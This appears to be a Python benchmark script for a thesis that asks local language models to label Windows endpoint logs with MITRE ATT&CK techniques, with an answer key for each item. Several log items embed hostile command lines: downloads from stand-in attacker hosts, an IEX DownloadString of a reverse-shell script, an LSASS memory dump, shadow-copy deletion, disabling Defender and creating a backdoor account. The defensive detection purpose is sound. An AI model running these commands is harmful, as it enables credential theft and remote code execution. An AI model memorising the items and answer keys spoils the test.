import requests
import json
import time
import csv
import os

# ==========================================
# 1. 測評環境設定
# ==========================================
OLLAMA_API = "http://localhost:11434/api/generate"
OUTPUT_CSV = "Thesis_Benchmark_Results.csv"

# 參賽選手名單 (您的實驗組與對照組)
MODELS_TO_TEST = [
    "phi3",              # 原廠菜鳥 (對照組 A)
    "llama3.1",          # 原廠大師 (對照組 B)
    "gemma4:e4b",          # 原廠大師 (對照組 C)
    "my-soc-agent"       # 海巡微調專家 (實驗組)
]

# ==========================================
# 2. 準備測試題庫 (請準備 10~20 筆您標註好的資料)
# ==========================================
# ==========================================
# 論文專屬測試題庫 (共 20 題：5 正常 + 15 攻擊)
# ==========================================
test_dataset = [
    # 🟢 【正常行為篇 - 測試模型是否會誤報】
    {
        "id": "Test_01_Benign_Browser",
        "log": '{"EventID": 1, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "CommandLine": "\\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\\" --type=renderer", "User": "CGA_DOMAIN\\user01"}',
        "ground_truth_ttp": "None (Benign)"
    },
    {
        "id": "Test_02_Benign_SystemLogon",
        "log": '{"EventID": 4624, "LogonType": 5, "IpAddress": "-", "User": "NT AUTHORITY\\SYSTEM"}',
        "ground_truth_ttp": "None (Benign)"
    },
    {
        "id": "Test_03_Benign_NetworkDNS",
        "log": '{"EventID": 3, "Image": "C:\\Windows\\System32\\svchost.exe", "DestinationIp": "8.8.8.8", "DestinationPort": 53, "Protocol": "udp"}',
        "ground_truth_ttp": "None (Benign)"
    },
    {
        "id": "Test_04_Benign_AdminPing",
        "log": '{"EventID": 1, "Image": "C:\\Windows\\System32\\PING.EXE", "CommandLine": "ping 192.168.1.254", "User": "CGA_DOMAIN\\admin"}',
        "ground_truth_ttp": "None (Benign)"
    },
    {
        "id": "Test_05_Benign_Taskmgr",
        "log": '{"EventID": 1, "Image": "C:\\Windows\\System32\\Taskmgr.exe", "CommandLine": "\\"C:\\Windows\\System32\\Taskmgr.exe\\"", "User": "CGA_DOMAIN\\user01"}',
        "ground_truth_ttp": "None (Benign)"
    },

    # 🔴 【惡意攻擊篇 - 測試特徵抓取與 TTP 分類】
    {
        "id": "Test_06_PowerShell_Obfuscation",
        "log": '{"EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -EncodedCommand JABzAD0ATgBl...", "User": "CGA_DOMAIN\\admin"}',
        "ground_truth_ttp": "T1059.001" # Command and Scripting Interpreter: PowerShell
    },
    {
        "id": "Test_07_LSASS_MemoryDump",
        "log": '{"EventID": 1, "Image": "C:\\Users\\Public\\procdump.exe", "CommandLine": "procdump.exe -accepteula -ma lsass.exe lsass.dmp", "User": "CGA_DOMAIN\\admin"}',
        "ground_truth_ttp": "T1003.001" # OS Credential Dumping: LSASS Memory
    },
    {
        "id": "Test_08_RDP_BruteForce",
        "log": '{"EventID": 4625, "LogonType": 3, "IpAddress": "45.33.22.11", "FailureReason": "Unknown user name or bad password.", "Status": "0xC000006D", "Count": "15"}',
        "ground_truth_ttp": "T1110.001" # Brute Force: Password Guessing
    },
    {
        "id": "Test_09_Disable_Defender",
        "log": '{"EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true", "User": "CGA_DOMAIN\\admin"}',
        "ground_truth_ttp": "T1562.001" # Impair Defenses: Disable or Modify Tools
    },
    {
        "id": "Test_10_Ingress_Tool_Transfer",
        "log": '{"EventID": 1, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://malicious-ip.com/payload.exe C:\\Windows\\Temp\\payload.exe", "User": "CGA_DOMAIN\\user01"}',
        "ground_truth_ttp": "T1105" # Ingress Tool Transfer
    },
    {
        "id": "Test_11_Scheduled_Task_Persistence",
        "log": '{"EventID": 1, "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn \\"WindowsUpdate\\" /tr \\"C:\\Temp\\reverse_shell.exe\\" /sc onstart /ru SYSTEM", "User": "CGA_DOMAIN\\admin"}',
        "ground_truth_ttp": "T1053.005" # Scheduled Task/Job: Scheduled Task
    },
    {
        "id": "Test_12_Create_Backdoor_Account",
        "log": '{"EventID": 1, "Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net user sysadmin_bck P@ssw0rd123! /add /Y", "User": "CGA_DOMAIN\\admin"}',
        "ground_truth_ttp": "T1136.001" # Create Account: Local Account
    },
    {
        "id": "Test_13_Delete_Shadow_Copies",
        "log": '{"EventID": 1, "Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet", "User": "CGA_DOMAIN\\admin"}',
        "ground_truth_ttp": "T1070.004" # Indicator Removal: File Deletion (Shadow Copies)
    },
    {
        "id": "Test_14_System_Info_Discovery",
        "log": '{"EventID": 1, "Image": "C:\\Windows\\System32\\systeminfo.exe", "CommandLine": "systeminfo > C:\\Temp\\sys.txt", "User": "CGA_DOMAIN\\user01"}',
        "ground_truth_ttp": "T1082" # System Information Discovery
    },
    {
        "id": "Test_15_Masquerading_svchost",
        "log": '{"EventID": 1, "Image": "C:\\Users\\user01\\Downloads\\svchost.exe", "CommandLine": "svchost.exe -k netsvcs", "User": "CGA_DOMAIN\\user01"}',
        "ground_truth_ttp": "T1036" # Masquerading (svchost running from Downloads)
    },
    {
        "id": "Test_16_Whoami_Discovery",
        "log": '{"EventID": 1, "Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami /all", "User": "CGA_DOMAIN\\user01"}',
        "ground_truth_ttp": "T1033" # System Owner/User Discovery
    },
    {
        "id": "Test_17_Rundll32_Execution",
        "log": '{"EventID": 1, "Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe javascript:\\"\\\\..\\\\mshtml,RunHTMLApplication \\";document.write();GetObject(\\"script:http://badsite.com/payload.sct\\")\\"", "User": "CGA_DOMAIN\\user01"}',
        "ground_truth_ttp": "T1218.011" # System Binary Proxy Execution: Rundll32
    },
    {
        "id": "Test_18_Network_Config_Discovery",
        "log": '{"EventID": 1, "Image": "C:\\Windows\\System32\\ipconfig.exe", "CommandLine": "ipconfig /all", "User": "CGA_DOMAIN\\user01"}',
        "ground_truth_ttp": "T1016" # System Network Configuration Discovery
    },
    {
        "id": "Test_19_Hide_File_Attrib",
        "log": '{"EventID": 1, "Image": "C:\\Windows\\System32\\attrib.exe", "CommandLine": "attrib +h +s C:\\Users\\Public\\mimikatz.exe", "User": "CGA_DOMAIN\\admin"}',
        "ground_truth_ttp": "T1564.001" # Hide Artifacts: Hidden Files and Directories
    },
    {
        "id": "Test_20_WMIC_Process_Call",
        "log": '{"EventID": 1, "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", "CommandLine": "wmic process call create \\"powershell.exe -c IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.10.10/rev.ps1\')\\"", "User": "CGA_DOMAIN\\admin"}',
        "ground_truth_ttp": "T1047" # Windows Management Instrumentation
    }
]
# 統一的 Alpaca Prompt 模板
def build_prompt(log_content):
    return f"""Below is an instruction that describes a task, paired with an input that provides further context. Write a response that appropriately completes the request.
### Instruction:
分析以下端點日誌，判斷是否具備惡意攻擊特徵，並輸出對應的 MITRE ATT&CK 標籤(TTP_ID)與解釋(Explanation)。請嚴格使用 JSON 格式輸出。
### Input:
{log_content}
### Response:"""

# ==========================================
# 3. 測評執行引擎
# ==========================================
results = []

print("🚀 開始執行自動化模型測評 (Benchmarking)...")

for model_name in MODELS_TO_TEST:
    print(f"\n🧠 正在測評模型: {model_name}")
    print("-" * 40)
    
    # 暖機 (Warm-up) - 不計入成績，確保模型已載入記憶體
    print("   [暖機中...] 載入模型至 VRAM")
    requests.post(OLLAMA_API, json={"model": model_name, "prompt": "hi", "stream": False})
    
    for item in test_dataset:
        print(f"   ➤ 測試題目: {item['id']} ... ", end="", flush=True)
        prompt = build_prompt(item['log'])
        
        payload = {
            "model": model_name,
            "prompt": prompt,
            "stream": False,
            "options": {
                "temperature": 0.0 # 論文比較基準：強制關閉隨機性
            }
        }
        
        start_time = time.time()
        response = requests.post(OLLAMA_API, json=payload)
        end_time = time.time()
        
        if response.status_code == 200:
            res_data = response.json()
            raw_output = res_data.get("response", "").strip()
            eval_time = round(end_time - start_time, 2)
            
            # ====== 【加入：強力 JSON 萃取器】 ======
            import re
            # 1. 移除 Markdown 的 ```json 與 ``` 標籤
            cleaned_output = re.sub(r'```json\s*', '', raw_output, flags=re.IGNORECASE)
            cleaned_output = re.sub(r'```\s*', '', cleaned_output)
            
            # 2. 尋找字串中的第一個 { 和最後一個 }
            start_idx = cleaned_output.find('{')
            end_idx = cleaned_output.rfind('}')
            
            if start_idx != -1 and end_idx != -1 and end_idx >= start_idx:
                json_str = cleaned_output[start_idx:end_idx+1]
            else:
                json_str = cleaned_output # 找不到就維持原樣，讓 try-except 去接
            # ========================================

            # 評估指標 1: JSON 格式是否正確？
            is_valid_json = False
            extracted_ttp = "解析失敗"
            try:
                # 【注意這裡改用清洗過的 json_str】
                parsed_json = json.loads(json_str) 
                
                # 【關鍵修正】：確保解析出來的是「字典 (dict)」
                if isinstance(parsed_json, dict):
                    # 檢查是否具備我們要求的 TTP_ID 欄位
                    if "TTP_ID" in parsed_json:
                        is_valid_json = True
                        extracted_ttp = parsed_json.get("TTP_ID")
                    else:
                        extracted_ttp = "遺漏 TTP_ID 欄位"
                else:
                    extracted_ttp = "格式非 JSON 字典 (Dict)"
                    
            except json.JSONDecodeError:
                extracted_ttp = "非合法 JSON 格式"
            
            # 評估指標 2: TTP 準確度？ (這行原本就在，保留不變)
            is_accurate = (extracted_ttp == item['ground_truth_ttp']) if is_valid_json else False
            
            # 紀錄該筆結果
            results.append({
                "Model": model_name,
                "Test_ID": item['id'],
                "Is_Valid_JSON": is_valid_json,
                "Is_Accurate": is_accurate,
                "Latency_Seconds": eval_time,
                "Raw_Output": raw_output.replace("\n", " ") # 存成單行方便看
            })
            print(f"完成! ({eval_time}s) | JSON: {is_valid_json} | 準確: {is_accurate}")
        else:
            print("❌ API 呼叫失敗")

# ==========================================
# 4. 輸出成 CSV 報表
# ==========================================
csv_columns = ["Model", "Test_ID", "Is_Valid_JSON", "Is_Accurate", "Latency_Seconds", "Raw_Output"]
file_exists = os.path.isfile(OUTPUT_CSV)

with open(OUTPUT_CSV, 'w', newline='', encoding='utf-8-sig') as csvfile:
    writer = csv.DictWriter(csvfile, fieldnames=csv_columns)
    writer.writeheader()
    for data in results:
        writer.writerow(data)

print(f"\n🎉 測評完畢！所有數據已匯出至: {OUTPUT_CSV}")
print("   您可以直接用 Excel 打開此檔案，繪製成論文圖表！")